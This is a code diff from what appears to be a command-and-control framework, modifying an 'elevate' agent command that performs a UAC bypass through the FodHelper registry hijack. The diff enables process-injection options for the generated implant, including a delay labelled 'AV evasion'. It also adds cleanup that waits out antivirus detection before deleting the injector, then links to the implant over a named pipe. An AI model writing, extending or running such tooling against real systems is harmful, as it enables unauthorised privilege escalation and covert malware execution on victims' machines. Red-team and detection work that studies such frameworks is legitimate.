@@ -27,17 +27,27 @@ namespace Common.AgentCommands.Custom
         [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "c:\\windows\\tasks")]
         public string path { get; set; }
 
-       /* [CommandOption("-i", "--inject", "If the payload should be an injector")]
-        public bool inject { get; set; }
-
-        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
-        public int injectDelay { get; set; }
-
-        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
-        public string injectProcess { get; set; }*/
-
         [Option("x86", "x86", "Generate a x86 architecture executable")]
         public bool x86 { get; set; }
+
+        //Injection options
+        [Option("i", "inject", "If the payload should be an injector")]
+        public bool inject { get; set; }
+
+        [Option("id", "injectDelay", "Delay before injection (AV evasion)", DefaultValue = 30)]
+        public int injectDelay { get; set; }
+
+        [Option("ipid", "injectProcessId", "Process Id used for injection", DefaultValue = null)]
+        public int? injectProcessId { get; set; }
+
+        [Option("ipn", "injectProcessName", "Process Name used for injection")]
+        public string injectProcessName { get; set; }
+
+        [Option("ips", "injectProcessSpawn", "Process Image path used for injection (spawn)")]
+        public string injectSpawn { get; set; }
+
+        [Option("d", "debug", "generate implant in debug mode")]
+        public bool debug { get; set; }
     }
 
     [Command("elevate", "UAC Bypass using FodHelper", Category = AgentCommandCategories.Composite)]
@@ -51,16 +61,19 @@ namespace Common.AgentCommands.Custom
                 StoreImplant = false,
                 Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                 Endpoint = endpoint,
-                IsDebug = false,
+                IsDebug = options.debug,
                 IsVerbose = options.verbose,
                 Type = ImplantType.Executable,
-                //InjectionDelay =  options.injectDelay,
-                //IsInjected = options.inject,
-                //InjectionProcess = options.injectProcess
             };
 
-            //if (!string.IsNullOrEmpty(options.injectProcess))
-            //    payloadOptions.InjectionProcess = options.injectProcess;
+            if (options.inject)
+            {
+                payloadOptions.IsInjected = true;
+                payloadOptions.InjectionDelay = options.injectDelay;
+                payloadOptions.InjectionProcessId = options.injectProcessId;
+                payloadOptions.InjectionProcessName = options.injectProcessName;
+                payloadOptions.InjectionProcessSpawn = options.injectSpawn;
+            }
 
             context.WriteInfo($"[>] Generating Implant!");
             var implant = await context.GeneratePayload(payloadOptions);
@@ -70,7 +83,7 @@ namespace Common.AgentCommands.Custom
                 return false;
             }
             else
-                context.WriteSuccess($"[+] Generation succeed!");
+                context.WriteSuccess($"[+] Generation succeed ({implant.Config.ImplantName})!");
 
 
             context.WriteInfo($"[>] Preparing Agent command flow...");
@@ -97,17 +110,17 @@ namespace Common.AgentCommands.Custom
             context.Echo($"[>] Cleaning");
             context.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
             context.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
-            //if (!options.inject)
-            //{
+            if (!options.inject)
+            {
                 context.Echo($"[!] Don't forget to remove executable after use! : del {path}");
-            //}
-            //else
-            //{
-            //    context.Echo($"Waiting {options.injectDelay}s to evade antivirus");
-            //    context.Delay(options.injectDelay + 10);
-            //    context.Echo($"Removing injector {path}");
-            //    context.DeleteFile(path);
-            //}
+            }
+            else
+            {
+                context.Echo($"[>] Waiting {options.injectDelay}s to evade antivirus");
+                context.Delay(options.injectDelay + 10);
+                context.Echo($"[>] Removing injector {path}");
+                context.DeleteFile(path);
+            }
             context.Echo($"[>] Linking to {endpoint}");
             var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
             context.Link(targetEndPoint);
